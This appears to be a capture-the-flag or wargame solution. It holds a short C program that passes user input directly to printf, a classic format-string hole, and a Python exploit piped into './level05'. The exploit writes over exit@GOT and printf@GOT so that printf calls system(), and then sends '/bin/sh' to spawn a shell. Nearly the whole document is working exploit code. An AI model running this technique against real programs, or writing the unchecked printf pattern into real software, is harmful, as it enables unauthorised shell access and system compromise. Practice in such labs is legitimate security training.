#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
	char buffer[100];
	unsigned int index = 0;

	if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
		exit(0);
	}

	index = 0;
	while (index < strlen(buffer)) {
		unsigned char current = (unsigned char)buffer[index];

		if (current > 0x40 && current <= 0x5a) {
			buffer[index] = (char)(current ^ 0x20);
		}

		index++;
	}

	printf(buffer);
	exit(0);
	exit(0);
}




(python - <<'PY'
import struct

EXIT_GOT   = 0x080497e0
PRINTF_GOT = 0x080497d4
MAIN       = 0x08048444

# Put the real runtime system() address here from gdb on target
SYSTEM     = 0xf7e6aed0

def fmt_write_2bytes(addr, value, i1=10, i2=11):
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff

    a_lo = struct.pack('<I', addr)
    a_hi = struct.pack('<I', addr + 2)

    if lo <= hi:
        head = a_lo + a_hi
        p1 = (lo - 8) % 0x10000
        p2 = (hi - lo) % 0x10000
        return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)
    else:
        head = a_hi + a_lo
        p1 = (hi - 8) % 0x10000
        p2 = (lo - hi) % 0x10000
        return head + "%%%dx%%%d$hn%%%dx%%%d$hn" % (p1, i1, p2, i2)

# Stage 1: exit@GOT -> main (prevents crash path)
print fmt_write_2bytes(EXIT_GOT, MAIN)

# Stage 2: printf@GOT -> system
print fmt_write_2bytes(PRINTF_GOT, SYSTEM)

# Stage 3: this becomes system("/bin/sh")
print "/bin/sh"
PY
cat) | ./level05